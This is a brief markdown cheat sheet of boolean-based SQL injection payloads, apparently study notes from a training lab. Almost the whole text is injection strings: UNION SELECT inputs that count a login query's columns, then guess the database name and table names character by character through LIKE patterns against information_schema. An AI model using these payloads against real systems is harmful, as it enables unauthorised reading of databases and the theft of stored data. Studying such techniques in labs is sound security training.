# SQL Injection

## Boolean Based

```sql
admin123' UNION SELECT 1;-- 
/Guess the number of columns that are returned
admin123' UNION SELECT 1,2,3;-- 
## Then we start guess the name of the database
admin123' UNION SELECT 1,2,3 where database() like '%';--
admin123' UNION SELECT 1,2,3 where database() like 's%';--
## Once we have the database name, we start searching for the table name
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--

```